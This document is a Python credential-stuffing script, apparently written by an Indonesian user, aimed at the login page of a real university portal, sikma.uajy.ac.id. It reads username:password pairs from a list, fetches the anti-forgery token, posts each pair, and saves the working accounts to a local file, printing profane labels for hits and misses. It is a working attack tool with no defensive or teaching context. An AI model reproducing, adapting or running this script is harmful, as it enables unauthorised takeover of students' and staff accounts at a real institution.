import os
os.system('clear')
import requests as req
import requests.packages.urllib3
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor
requests.packages.urllib3.disable_warnings()

grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[37m'
flag = '\x1b[47;30m'
off = '\x1b[m'

def start(file):
	try:
		with open(file, 'r') as file:
			num  = 0
			failed  = []
			success = []
			barisan = file.readlines()
			print(f"{cyan}Total {white}{len(barisan)} {cyan}baris terdeteksi")
			for baris in barisan:
				num +=1
				u = baris.split(':')[0]
				p = baris.split(':')[1]
				usr = u.strip()
				pwd = p.strip()
				
				
				ses = req.Session()
				url = 'https://sikma.uajy.ac.id/Account/Login'
				raw = ses.get(url).text 
				tok = bs(raw, 'html.parser').findAll('input')
				tok1 = tok[4]['value']
				dat = { "__RequestVerificationToken":tok1,
                   "username":usr,
                   "password":pwd, }
				res = ses.post(url, data=dat).text 
				qn = bs(res, 'html.parser').find('title')
				if qn.text == 'Login - SIKMA':
					print(f"{red}>>> {num}{white} >{red} {usr}{white}:{red}{pwd} {off}> {red}BANGSAT{off}")
					failed.append(f'{baris.strip()}')
				else:
					print(f"{green}>>> {num}{white} >{green} {usr}{white}:{green}{pwd} {off} {green}MANTAPANJING{off}")
					success.append(f'{baris.strip()}')
					with open('uajy_aktif.txt', 'a') as ok:
						ok.write(f"{usr}:{pwd}\n")
				
			exit(f"{purple}>>{white} Akun aktif tersimpan di {purple}uajy_aktif.txt{off}")
	except Exception as er:
	    print(f'\033[91m{er}')

def main():
	print(f"{blue}   __  _____       ____  __\n{purple}  / / / /   |     / /\ \/ /\n{cyan} / / / / /| |__  / /  \  / \n{off}/ /_/ / ___ / /_/ /   / /  \n{off}\____/_/  |_\____/   /_/   ")
	print(f"{flag}    RANIA SALSABILLA    {off }")
	print()
	print(f"{red}>> {off}GAK PAHAM GOBLOK")
	file = input(f"{green}>>> {white}Input list > ") 
	start(file)
	
	
if __name__ == '__main__':
	main()
 